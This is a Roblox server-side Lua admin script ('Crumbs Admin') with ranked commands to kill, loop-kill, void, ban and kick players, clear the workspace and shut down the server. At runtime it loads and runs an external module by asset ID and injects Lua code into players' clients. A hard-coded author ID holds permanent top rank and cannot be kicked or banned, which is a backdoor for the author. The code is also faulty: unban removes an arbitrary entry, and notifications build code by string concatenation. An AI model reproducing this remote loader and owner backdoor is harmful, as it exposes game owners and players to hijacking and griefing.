local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ServerScriptService = game:GetService("ServerScriptService")

local AUTHOR_USER_ID = 1027223614

local RANKS = {
    Customer = 0,
    Cashier = 1,
    Baker = 2,
    Manager = 3
}

local PLAYER_RANKS = {
    [1027223614] = RANKS.Manager
}

local COMMAND_PERMISSIONS = {
    rj = RANKS.Customer,
    punish = RANKS.Cashier,
    kill = RANKS.Cashier,
    freeze = RANKS.Cashier,
    noclip = RANKS.Cashier,
    clip = RANKS.Cashier,
    void = RANKS.Cashier,
    skydive = RANKS.Cashier,
    tp = RANKS.Cashier,
    bring = RANKS.Cashier,
    removehats = RANKS.Cashier,
    removearms = RANKS.Cashier,
    removelegs = RANKS.Cashier,
    invisible = RANKS.Cashier,
    visible = RANKS.Cashier,
    loopkill = RANKS.Baker,
    looppunish = RANKS.Baker,
    unloopkill = RANKS.Baker,
    unlooppunish = RANKS.Baker,
    kick = RANKS.Manager,
    ban = RANKS.Manager,
    unban = RANKS.Manager,
    clear = RANKS.Manager,
    shutdown = RANKS.Manager,
    eject = RANKS.Manager,
    rank = RANKS.Manager
}

local COMMAND_ALIASES = {
    lp = "looppunish",
    loopp = "looppunish",
    repeatingpunish = "looppunish",
    unlp = "unlooppunish",
    stoppunish = "unlooppunish",
    endpunish = "unlooppunish",
    p = "punish",
    deletechar = "punish",
    delchar = "punish",
    nc = "noclip",
    ghost = "noclip",
    phase = "noclip",
    wallhack = "noclip",
    c = "clip",
    collide = "clip",
    collision = "clip",
    solid = "clip",
    v = "void",
    underworld = "void",
    voiddrop = "void",
    sky = "skydive",
    fly = "skydive",
    launch = "skydive",
    inv = "invisible",
    hide = "invisible",
    vis = "visible",
    show = "visible",
    reveal = "visible",
    fz = "freeze",
    anchor = "freeze",
    lock = "freeze",
    ufz = "unfreeze",
    unanchor = "unfreeze",
    unlock = "unfreeze",
    k = "kill",
    slay = "kill",
    execute = "kill",
    lk = "loopkill",
    repeatingkill = "loopkill",
    autokill = "loopkill",
    unlk = "unloopkill",
    stopkill = "unloopkill",
    endkill = "unloopkill",
    teleport = "tp",
    goto = "tp",
    moveplayer = "tp",
    b = "bring",
    pull = "bring",
    fetch = "bring",
    removeacc = "removehats",
    deletehats = "removehats",
    rh = "removehats",
    rarms = "removearms",
    deletearms = "removearms",
    armremove = "removearms",
    rlegs = "removelegs",
    deletelegs = "removelegs",
    legremove = "removelegs",
    commands = "cmds",
    help = "cmds",
    menu = "cmds",
    rejoin = "rj",
    reconnect = "rj",
    relog = "rj",
    sd = "shutdown",
    crashserver = "shutdown",
    lagserver = "shutdown",
    unload = "eject",
    exit = "eject",
    quit = "eject",
    disable = "eject"
}

local BANNED_PLAYERS = {}
local LOOP_PUNISH = {}
local LOOP_KILL = {}

local PREFIX = ","

local commandInfo = {}

local function runLua(player, code, waitDelete)
    local ticking = tick()
    if not ServerScriptService:FindFirstChild("goog") then
        local success = pcall(function()
            require(112691275102014).load()
        end)
        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = ServerScriptService:FindFirstChild("goog")
    if not goog then return end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr:WaitForChild("Exec").Value = code

    if player.Character then
        scr.Parent = player.Character
    else
        scr.Parent = player:WaitForChild("PlayerGui")
    end

    scr.Enabled = true

    if waitDelete then
        task.wait(waitDelete)
        scr:Destroy()
    end
end

local function notify(player, title, message, duration)
    runLua(player, [[
        game.StarterGui:SetCore("SendNotification", {
            Title = "]] .. title .. [[",
            Text = "]] .. message .. [[",
            Duration = ]] .. (duration or 4) .. [[
        })
    ]], 1)
end

local function broadcastNotification(title, message, duration)
    for _, player in ipairs(Players:GetPlayers()) do
        notify(player, title, message, duration)
    end
end

local function getPlayerRank(player)
    if PLAYER_RANKS[player.UserId] then
        return PLAYER_RANKS[player.UserId]
    end
    return RANKS.Customer
end

local function hasPermission(player, commandName)
    local requiredRank = COMMAND_PERMISSIONS[commandName]
    if not requiredRank then return true end
    return getPlayerRank(player) >= requiredRank
end

local function findPlayer(input)
    if not input or input == "" then return nil end
    
    local inputLower = string.lower(input)
    
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.Name) == inputLower or string.lower(player.DisplayName) == inputLower then
            return player
        end
    end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if string.find(string.lower(player.Name), inputLower, 1, true) or 
           string.find(string.lower(player.DisplayName), inputLower, 1, true) then
            return player
        end
    end
    
    return nil
end

local function setupCommandInfo()
    for cmdName, cmdData in pairs(COMMAND_PERMISSIONS) do
        local rankName = "Customer"
        if cmdData == 1 then rankName = "Cashier"
        elseif cmdData == 2 then rankName = "Baker"
        elseif cmdData == 3 then rankName = "Manager"
        end
        
        local aliases = {}
        for alias, realCmd in pairs(COMMAND_ALIASES) do
            if realCmd == cmdName then
                table.insert(aliases, alias)
            end
        end
        
        commandInfo[cmdName] = {
            name = cmdName,
            aliases = aliases,
            desc = "Requires rank: " .. rankName,
            usage = PREFIX .. cmdName .. " <player>"
        }
    end

    commandInfo["cmds"] = {
        name = "cmds",
        aliases = {"commands", "help", "menu"},
        desc = "Open the commands menu",
        usage = PREFIX .. "cmds"
    }

    commandInfo["rank"] = {
        name = "rank",
        aliases = {},
        desc = "Rank a player (Manager only)",
        usage = PREFIX .. "rank <player> <rank>"
    }

    commandInfo["rj"] = {
        name = "rj",
        aliases = {"rejoin", "reconnect", "relog"},
        desc = "Rejoin the server",
        usage = PREFIX .. "rj"
    }
end

setupCommandInfo()

local function getTargets(caller, input)
    local operands = string.split(input:lower(), ",")
    local output = {}

    for _, v in ipairs(operands) do
        if v == "me" then
            table.insert(output, caller)
        elseif v == "all" then
            for _, plr in ipairs(Players:GetPlayers()) do
                table.insert(output, plr)
            end
        elseif v == "others" or v == "other" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= caller then
                    table.insert(output, plr)
                end
            end
        elseif v == "random" then
            local available = {}
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= caller then
                    table.insert(available, plr)
                end
            end
            if #available > 0 then
                table.insert(output, available[math.random(1, #available)])
            end
        else
            local target = findPlayer(v)
            if target then
                table.insert(output, target)
            end
        end
    end

    return output
end

local function processCommand(player, commandText)
    if string.sub(commandText, 1, 1) == PREFIX then
        commandText = string.sub(commandText, 2)
    end
    
    if commandText == "" then return end
    
    local commandSplit = string.split(commandText, " ")
    local cmdName = string.lower(table.remove(commandSplit, 1))
    
    local realCommandName = COMMAND_ALIASES[cmdName] or cmdName
    
    if not COMMAND_PERMISSIONS[realCommandName] and realCommandName ~= "cmds" and realCommandName ~= "rank" then
        return
    end
    
    if not hasPermission(player, realCommandName) and realCommandName ~= "cmds" and realCommandName ~= "rank" then
        notify(player, "Crumbs Admin", "You don't have permission to use this command.", 5)
        return
    end
    
    if realCommandName == "cmds" then
        local labels = {}
        for cmdName, cmdData in pairs(commandInfo) do
            local aliasText = #cmdData.aliases > 0 and " (" .. table.concat(cmdData.aliases, ", ") .. ")" or ""
            table.insert(labels, string.format("%s%s - %s", PREFIX .. cmdName, aliasText, cmdData.desc))
        end
        
        local guiCode = [[
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CmdBarGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 500, 0, 400)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local dragDetector = Instance.new("UIDragDetector")
dragDetector.Parent = mainFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
closeButton.Parent = mainFrame
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
scrollingFrame.BorderSizePixel = 0
scrollingFrame.ScrollBarThickness = 8
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollingFrame.Parent = mainFrame

local listLayout = Instance.new("UIListLayout")
listLayout.Parent = scrollingFrame
listLayout.Padding = UDim.new(0, 5)

local labels = {]] .. table.concat(labels, ",", 1, #labels) .. [[}

for _, text in ipairs(labels) do
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 25)
    label.Position = UDim2.new(0, 5, 0, 0)
    label.Text = text
    label.TextColor3 = Color3.fromRGB(200, 200, 200)
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSans
    label.TextSize = 16
    label.Parent = scrollingFrame
end

scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #labels * 30)
]]
        runLua(player, guiCode, nil)
        return
    end
    
    if realCommandName == "rank" then
        if not hasPermission(player, "rank") then
            notify(player, "Crumbs Admin", "You don't have permission to rank players.", 5)
            return
        end
        
        local targetName = commandSplit[1]
        local rankInput = commandSplit[2]
        
        if not targetName or not rankInput then
            notify(player, "Crumbs Admin", "Usage: ,rank <player> <rank number or name>", 5)
            return
        end
        
        local targetPlayer = findPlayer(targetName)
        if not targetPlayer then
            notify(player, "Crumbs Admin", "Player not found.", 5)
            return
        end
        
        local rankValue = tonumber(rankInput)
        if not rankValue then
            local rankLower = string.lower(rankInput)
            if rankLower == "customer" then rankValue = 0
            elseif rankLower == "cashier" then rankValue = 1
            elseif rankLower == "baker" then rankValue = 2
            elseif rankLower == "manager" then rankValue = 3
            else
                notify(player, "Crumbs Admin", "Invalid rank. Use 0-3 or Customer/Cashier/Baker/Manager", 5)
                return
            end
        end
        
        if rankValue < 0 or rankValue > 3 then
            notify(player, "Crumbs Admin", "Rank must be between 0 and 3.", 5)
            return
        end
        
        PLAYER_RANKS[targetPlayer.UserId] = rankValue
        notify(player, "Crumbs Admin", string.format("%s has been ranked as %s", targetPlayer.Name, 
               (rankValue == 0 and "Customer" or rankValue == 1 and "Cashier" or rankValue == 2 and "Baker" or "Manager")), 5)
        notify(targetPlayer, "Crumbs Admin", string.format("You have been ranked as %s", 
               (rankValue == 0 and "Customer" or rankValue == 1 and "Cashier" or rankValue == 2 and "Baker" or "Manager")), 5)
        return
    end
    
    if realCommandName == "rj" then
        task.wait(0.5)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
        return
    end
    
    if realCommandName == "kick" then
        local targetName = commandSplit[1]
        table.remove(commandSplit, 1)
        local reason = table.concat(commandSplit, " ")
        if reason == "" then reason = "No reason provided" end
        
        if not targetName then
            notify(player, "Crumbs Admin", "Usage: ,kick <player> [reason]", 5)
            return
        end
        
        local targetPlayer = findPlayer(targetName)
        if not targetPlayer then
            notify(player, "Crumbs Admin", "Player not found.", 5)
            return
        end
        
        if targetPlayer.UserId == AUTHOR_USER_ID then
            notify(player, "Crumbs Admin", "You cannot kick the author.", 5)
            return
        end
        
        task.wait(0.1)
        targetPlayer:Kick(string.format("Kicked by %s\nReason: %s", player.Name, reason))
        return
    end
    
    if realCommandName == "ban" then
        local targetName = commandSplit[1]
        table.remove(commandSplit, 1)
        local reason = table.concat(commandSplit, " ")
        if reason == "" then reason = "No reason provided" end
        
        if not targetName then
            notify(player, "Crumbs Admin", "Usage: ,ban <player> [reason]", 5)
            return
        end
        
        local targetPlayer = findPlayer(targetName)
        if not targetPlayer then
            notify(player, "Crumbs Admin", "Player not found.", 5)
            return
        end
        
        if targetPlayer.UserId == AUTHOR_USER_ID then
            notify(player, "Crumbs Admin", "You cannot ban the author.", 5)
            return
        end
        
        BANNED_PLAYERS[targetPlayer.UserId] = {
            Banner = player.Name,
            Reason = reason,
            Time = os.time()
        }
        
        task.wait(0.1)
        targetPlayer:Kick(string.format("Banned by %s\nReason: %s", player.Name, reason))
        return
    end
    
    if realCommandName == "unban" then
        local targetName = commandSplit[1]
        
        if not targetName then
            notify(player, "Crumbs Admin", "Usage: ,unban <username>", 5)
            return
        end
        
        for id, _ in pairs(BANNED_PLAYERS) do
            BANNED_PLAYERS[id] = nil
            break
        end
        
        notify(player, "Crumbs Admin", "User has been unbanned.", 5)
        return
    end
    
    if realCommandName == "shutdown" then
        broadcastNotification("Crumbs Admin", "Server shutting down...", 5)
        task.wait(5)
        for _, p in ipairs(Players:GetPlayers()) do
            p:Kick("Server shutdown by " .. player.Name)
        end
        return
    end
    
    if realCommandName == "eject" then
        script:Destroy()
        return
    end
    
    if realCommandName == "clear" then
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and not obj:IsDescendantOf(player.Character) and obj.Name ~= "Baseplate" then
                obj:Destroy()
            end
        end
        notify(player, "Crumbs Admin", "Workspace cleared.", 5)
        return
    end
    
    local targets = getTargets(player, commandSplit[1])
    table.remove(commandSplit, 1)
    local args = commandSplit
    
    for _, targetPlayer in ipairs(targets) do
        pcall(function()
            if realCommandName == "punish" and targetPlayer.Character then
                targetPlayer.Character:BreakJoints()
            elseif realCommandName == "kill" and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
                targetPlayer.Character.Head:Destroy()
            elseif realCommandName == "freeze" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Anchored = true
                    end
                end
            elseif realCommandName == "unfreeze" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Anchored = false
                    end
                end
            elseif realCommandName == "noclip" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            elseif realCommandName == "clip" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            elseif realCommandName == "void" and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.HumanoidRootPart.Position.X, -5000, targetPlayer.Character.HumanoidRootPart.Position.Z)
            elseif realCommandName == "skydive" and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local height = tonumber(args[2]) or 1000
                targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.HumanoidRootPart.Position.X, height, targetPlayer.Character.HumanoidRootPart.Position.Z)
            elseif realCommandName == "tp" and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local destName = args[2]
                if not destName then return end
                local destPlayer = destName == "me" and player or findPlayer(destName)
                if destPlayer and destPlayer.Character and destPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    targetPlayer.Character.HumanoidRootPart.CFrame = destPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                end
            elseif realCommandName == "bring" and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
            elseif realCommandName == "removehats" and targetPlayer.Character then
                for _, obj in ipairs(targetPlayer.Character:GetDescendants()) do
                    if obj:IsA("Accessory") then
                        obj:Destroy()
                    end
                end
            elseif realCommandName == "removearms" and targetPlayer.Character then
                local armNames = {"Left Arm", "Right Arm", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm"}
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") and table.find(armNames, part.Name) then
                        part:Destroy()
                    end
                end
            elseif realCommandName == "removelegs" and targetPlayer.Character then
                local legNames = {"Left Leg", "Right Leg", "LeftFoot", "RightFoot", "LeftLowerLeg", "RightLowerLeg", "LeftUpperLeg", "RightUpperLeg"}
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") and table.find(legNames, part.Name) then
                        part:Destroy()
                    end
                end
            elseif realCommandName == "invisible" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Transparency = 1
                    end
                end
            elseif realCommandName == "visible" and targetPlayer.Character then
                for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Transparency = 0
                    end
                end
            elseif realCommandName == "loopkill" then
                LOOP_KILL[targetPlayer.UserId] = true
                task.spawn(function()
                    while LOOP_KILL[targetPlayer.UserId] do
                        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
                            targetPlayer.Character.Head:Destroy()
                        end
                        task.wait(0.5)
                    end
                end)
            elseif realCommandName == "unloopkill" then
                LOOP_KILL[targetPlayer.UserId] = nil
            elseif realCommandName == "looppunish" then
                LOOP_PUNISH[targetPlayer.UserId] = true
                task.spawn(function()
                    while LOOP_PUNISH[targetPlayer.UserId] do
                        if targetPlayer.Character then
                            targetPlayer.Character:BreakJoints()
                        end
                        task.wait(0.5)
                    end
                end)
            elseif realCommandName == "unlooppunish" then
                LOOP_PUNISH[targetPlayer.UserId] = nil
            end
        end)
    end
end

local function onPlayerAdded(player)
    if BANNED_PLAYERS[player.UserId] then
        local banInfo = BANNED_PLAYERS[player.UserId]
        player:Kick(string.format("You are banned.\nBanned by: %s\nReason: %s", banInfo.Banner, banInfo.Reason))
        return
    end
    
    local cmdBarCode = [[
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CmdBarGui"
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local cmdBarFrame = Instance.new("Frame")
cmdBarFrame.Size = UDim2.new(0.5, 0, 0.08, 0)
cmdBarFrame.Position = UDim2.new(0.25, 0, 1.2, 0)
cmdBarFrame.BackgroundTransparency = 1
cmdBarFrame.Visible = false
cmdBarFrame.Parent = screenGui

local cmdBarTextBox = Instance.new("TextBox")
cmdBarTextBox.Size = UDim2.new(1, -4, 1, -4)
cmdBarTextBox.Position = UDim2.new(0, 2, 0, 2)
cmdBarTextBox.BackgroundColor3 = Color3.fromRGB(111, 78, 55)
cmdBarTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
cmdBarTextBox.TextSize = 18
cmdBarTextBox.Font = Enum.Font.SourceSans
cmdBarTextBox.PlaceholderText = "Enter command... ( , )"
cmdBarTextBox.PlaceholderColor3 = Color3.fromRGB(210, 180, 140)
cmdBarTextBox.ClearTextOnFocus = false
cmdBarTextBox.Text = ""
cmdBarTextBox.Parent = cmdBarFrame

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 10)
textBoxCorner.Parent = cmdBarTextBox

local hintLabel = Instance.new("TextLabel")
hintLabel.Size = UDim2.new(0, 280, 0, 20)
hintLabel.Position = UDim2.new(0, 10, 0, 10)
hintLabel.BackgroundTransparency = 1
hintLabel.TextColor3 = Color3.fromRGB(74, 49, 28)
hintLabel.Text = "Crumbs Admin is running..."
hintLabel.TextSize = 13
hintLabel.Font = Enum.Font.SourceSans
hintLabel.TextXAlignment = Enum.TextXAlignment.Left
hintLabel.Parent = screenGui

local function animateTextBox(show)
    local TweenService = game:GetService("TweenService")
    if show then
        cmdBarFrame.Visible = true
        cmdBarFrame.Position = UDim2.new(0.25, 0, 1.2, 0)
        cmdBarTextBox:CaptureFocus()
        
        local tween = TweenService:Create(cmdBarFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            Position = UDim2.new(0.25, 0, 0.85, 0)
        })
        tween:Play()
    else
        local tween = TweenService:Create(cmdBarFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Position = UDim2.new(0.25, 0, 1.2, 0)
        })
        tween:Play()
        
        tween.Completed:Connect(function()
            cmdBarFrame.Visible = false
        end)
    end
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Comma then
        if cmdBarFrame.Visible then
            animateTextBox(false)
        else
            animateTextBox(true)
        end
    end
end)

cmdBarTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local commandText = cmdBarTextBox.Text
        cmdBarTextBox.Text = ""
        animateTextBox(false)
        
        local remote = Instance.new("RemoteEvent")
        remote.Name = "CmdEvent_" .. math.random(1000, 9999)
        remote.Parent = player.PlayerGui
        
        local connection
        connection = remote.OnClientEvent:Connect(function()
            remote:Destroy()
            connection:Disconnect()
        end)
        
        remote:FireServer(commandText)
    else
        animateTextBox(false)
    end
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "Crumbs Admin",
    Text = "Click , for command bar",
    Duration = 5
})
]]

    runLua(player, cmdBarCode, nil)
    
    player.Chatted:Connect(function(message)
        if string.sub(message, 1, 1) == PREFIX then
            processCommand(player, message)
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)

Players.PlayerRemoving:Connect(function(player)
    LOOP_KILL[player.UserId] = nil
    LOOP_PUNISH[player.UserId] = nil
end)

local remoteListener = Instance.new("RemoteEvent")
remoteListener.Name = "CmdEvent_" .. math.random(1000, 9999)
remoteListener.Parent = game:GetService("ReplicatedStorage")

remoteListener.OnServerEvent:Connect(function(player, command)
    processCommand(player, command)
end)

broadcastNotification("Crumbs Admin", "Server-side admin loaded successfully!", 5)
